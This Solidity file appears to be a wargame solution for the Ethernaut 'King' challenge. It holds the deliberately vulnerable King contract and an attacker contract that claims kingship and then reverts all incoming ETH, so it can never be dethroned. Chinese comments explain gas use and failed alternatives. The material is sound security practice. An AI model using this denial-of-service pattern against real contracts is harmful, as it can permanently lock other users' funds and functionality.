// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        // console.log("price:", prize);
        // console.log("msg.value:", msg.value);
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
        console.log("king changed to:", king);
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract UnchangedKing {
    address private king;

    constructor(address _k) {
        king = _k;
    }

    function overtake() external payable {
        // console.log("start overtake, msg.value:", msg.value);
        // console.log("start overtake, gasleft  :", gasleft());
        // case1: 可行
        (bool success,) = king.call{value: 0.001 ether}("");
        // 这样会出错，gas是为了后面支付合约执行使用的, 真实值会远大于 msg.value, 而且不是一个维度的东西
        // (bool success, ) = king.call{value: gasleft() * 19 /20}("");
        require(success, "send eth failed");
    }

    receive() external payable {
        revert("No direct ETH transfers allowed");
        // 下面这种写法是不行的。因为owner可以transfer(0)给当前合约，导致下面这个判断不生效
        // require(msg.value < 1, "reject be overtaken!");
    }
}
